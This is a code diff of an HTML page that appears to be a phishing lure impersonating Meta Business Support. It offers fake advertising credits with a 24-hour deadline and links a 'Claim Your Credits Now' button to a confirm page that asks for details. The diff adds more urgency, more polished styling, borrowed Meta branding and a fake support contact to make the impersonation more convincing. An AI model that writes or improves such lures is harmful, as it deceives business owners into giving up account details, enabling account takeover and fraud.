@@ -13,8 +13,8 @@
   <style>
     body {
       margin: 0;
-      font-family: Arial, sans-serif;
-      background-color: #f0f2f5;
+      font-family: 'Helvetica Neue', Arial, sans-serif;
+      background: linear-gradient(135deg, #e6f0fa 0%, #d1e3ff 100%);
       display: flex;
       justify-content: center;
       align-items: center;
@@ -22,65 +22,96 @@
       padding: 20px;
     }
     .container {
-      background-color: white;
+      background: linear-gradient(145deg, #ffffff, #f8faff);
       max-width: 600px;
       width: 100%;
-      padding: 30px;
-      border-radius: 10px;
-      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+      padding: 40px;
+      border-radius: 15px;
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.15);
       text-align: center;
     }
     .meta-logo {
-      width: 50px;
-      margin-bottom: 20px;
+      width: 60px;
+      margin-bottom: 25px;
     }
     .title {
-      font-size: 24px;
+      font-size: 28px;
       font-weight: bold;
-      margin-bottom: 20px;
+      color: #1a3c87;
+      margin-bottom: 25px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
     }
     .alert-box {
-      background-color: #eeeeee;
-      padding: 15px;
-      margin-bottom: 20px;
+      background-color: #e7f3ff;
+      padding: 20px;
+      border-radius: 8px;
+      margin-bottom: 25px;
+      border-left: 4px solid #1877f2;
     }
     .alert-box p {
       margin: 0;
       font-size: 16px;
+      color: #333;
     }
     .section {
       text-align: left;
-      margin-bottom: 20px;
+      margin-bottom: 25px;
     }
     .section h3 {
-      margin-bottom: 10px;
+      margin-bottom: 12px;
       font-size: 18px;
+      color: #1a3c87;
+      display: flex;
+      align-items: center;
+      gap: 8px;
     }
     .section p {
       margin: 0;
       font-size: 16px;
+      color: #444;
+      line-height: 1.5;
     }
     .button {
       display: inline-block;
       background-color: #1877f2;
       color: white;
-      padding: 12px 24px;
+      padding: 14px 30px;
       border: none;
-      border-radius: 6px;
+      border-radius: 8px;
       font-size: 16px;
+      font-weight: bold;
       cursor: pointer;
       text-decoration: none;
-      margin-top: 20px;
+      margin-top: 25px;
       width: -webkit-fill-available;
+      transition: background-color 0.3s, transform 0.2s;
+    }
+    .button:hover {
+      background-color: #145db5;
+      transform: translateY(-2px);
     }
     .footer {
       font-size: 14px;
-      color: #888;
+      color: #666;
       margin-top: 30px;
+      line-height: 1.6;
+    }
+    .footer a {
+      color: #1877f2;
+      text-decoration: none;
+    }
+    .footer a:hover {
+      text-decoration: underline;
     }
     @media (max-width: 600px) {
+      .container {
+        padding: 20px;
+      }
       .title {
-        font-size: 20px;
+        font-size: 22px;
       }
       .alert-box p,
       .section p,
@@ -88,8 +119,7 @@
         font-size: 15px;
       }
       .button {
-        width: 100%;
-        padding: 14px;
+        padding: 12px;
       }
     }
   </style>
@@ -97,28 +127,32 @@
 <body>
   <div class="container">
     <img src="https://brandlogos.net/wp-content/uploads/2021/10/meta_platforms_icon-logo_brandlogos.net_f5zqr.png" alt="Meta Logo" class="meta-logo">
-    <div class="title">Meta Business Support <img src="https://torro.io/hs-fs/hubfs/Meta-Verified-Packages-Checkmark.png" alt="Verification" class="blue-check" style="height: 16px;"></div>
+    <div class="title">Meta Business Support <img src="https://torro.io/hs-fs/hubfs/Meta-Verified-Packages-Checkmark.png" alt="Verification" class="blue-check" style="height: 18px;"></div>
     <div class="alert-box">
-      <p><strong>🎉 You have received advertising credits</strong><br><br>
-      24 hours left to claim your credits or they will expire</p>
-      <p id="credit-date" style="margin-top: 10px; color: gray;"></p>
+      <p><strong>🎉 Unlock Your Exclusive Advertising Credits!</strong><br><br>
+      Don’t miss out! You have 24 hours to claim your credits and boost your business. Act now to seize this limited-time offer!</p>
+      <p id="credit-date" style="margin-top: 12px; color: #555;"></p>
     </div>
     <div class="section">
-      <h3>What this means</h3>
-      <p>Your Facebook and Instagram accounts are eligible to receive a generous package of advertising credits, including up to $500 for boosted posts, $300 for targeted ad campaigns, and $200 for sponsored stories to promote your business or services across our platforms.</p>
+      <h3>💼 Your Exclusive Offer</h3>
+      <p>Congratulations! You've been selected for an exclusive advertising credit package to skyrocket your brand:<br>
+      • Up to <strong>$500</strong> for boosted posts to reach new audiences.<br>
+      • <strong>$300</strong> for targeted ad campaigns to drive engagement.<br>
+      • <strong>$200</strong> for sponsored stories to showcase your business on Facebook and Instagram.</p>
     </div>
     <div class="section">
-      <h3>What you can do</h3>
-      <p>You have 24 hours left to claim your advertising credits. We may need to collect some information from you to process the claim.</p>
+      <h3>🚀 How to Get Started</h3>
+      <p>Claim your credits within the next 24 hours to start growing your business. A few quick details may be needed to activate this special offer.</p>
     </div>
     <div class="section">
-      <h3>Why this happened</h3>
-      <p>Your account was selected to receive advertising credits as part of our promotional program to support businesses, in accordance with our <a href="#">Terms</a> and <a href="#">Community Standards</a>.</p>
+      <h3>ℹ️ Why You Received This</h3>
+      <p>Your account was selected for this exclusive offer as part of Meta’s program to empower businesses. See our <a href="#">Terms</a> and <a href="#">Community Standards</a> for details.</p>
     </div>
-    <a href="/confirm.html" class="button">Claim Credits</a>
+    <a href="/confirm.html" class="button">Claim Your Credits Now</a>
     <div class="footer">
-      from <strong>Meta</strong><br>
-      Meta Terms of Service Team © <script>document.write(new Date().getFullYear());</script> Inc.
+      From <strong>Meta</strong><br>
+      Meta Business Support Team © <script>document.write(new Date().getFullYear());</script> Inc.<br>
+      Need help? Visit our <a href="#">Help Center</a> or contact us at <a href="mailto:support@meta.com">support@meta.com</a>.
     </div>
   </div>
 
